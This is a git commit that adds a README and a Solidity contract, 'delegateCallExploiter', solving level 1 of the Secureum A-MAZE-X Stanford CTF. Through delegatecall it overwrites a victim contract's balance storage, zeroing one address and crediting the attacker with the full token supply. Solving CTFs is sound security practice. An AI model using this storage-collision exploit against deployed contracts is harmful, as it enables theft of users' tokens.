4b89433b87f7eb827b474c89e3b5ce149a2e98d4
jovi <77895278+joaovwfreire@users.noreply.github.com>
2022-11-05 09:18:29 -0300

    Level 1

--- README.md
+++ README.md
@@ -1,2 +1,8 @@
 # Secureum-A-MAZE-X-Stanford-Solutions
-My solutions to Secureum A-MAZE-X Stanford's CTF 
+My solutions to Secureum A-MAZE-X Stanford's CTF. 
+
+All the problems can be found at https://ctf-maker-monorepo.vercel.app/ . 
+
+I've decided to play this CTF challenges on Remix as I have already been doing Ethernaut's challenges with hardhat. 
+
+Figuring level 3 out was quite an experience. 
---
+++ contracts/level1.sol
@@ -0,0 +1,46 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.14;
+
+import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract delegateCallExploiter {
+   
+    IERC20 public token;
+    mapping(address => uint) public memorySlot1;
+    uint public uselessSlot;
+    address public here;
+    
+
+    constructor(IERC20 _token){
+        token = _token;
+        here = address(this);
+    }
+
+    function attack(address attackReceiver) public returns(bool){
+        memorySlot1[attackReceiver] = 0;
+        
+        return true;
+    }
+    function attack2(address attackRunner) public returns(bool){
+        uint totals = token.totalSupply();
+        memorySlot1[attackRunner] = totals;
+        
+        return true;
+    }
+
+    function bytesGet1(address attackReceiver) public pure returns(bytes memory){
+        
+        return abi.encodeWithSignature("attack(address)", attackReceiver);
+        
+    }
+
+    function bytesGet2(address attackRunner) public pure returns(bytes memory){
+        
+        return abi.encodeWithSignature("attack2(address)", attackRunner);
+        
+    }
+
+}
+
